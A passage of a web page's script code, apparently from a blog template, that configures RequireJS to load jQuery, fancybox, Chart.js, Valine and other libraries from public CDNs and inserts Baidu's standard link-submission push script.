{require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script> <script type="text/javascript">
                  ;(function() {
                    var bp = document.createElement('script')
                    var curProtocol = window.location.protocol.split(':')[0]
                    if (curProtocol === 'https') {
                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
                    } else {
                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
                    }
                    var s = document.getElementsByTagName('script')[0]
                    s.parentNode.insertBefore(bp, s)
                  })()
                </script> 
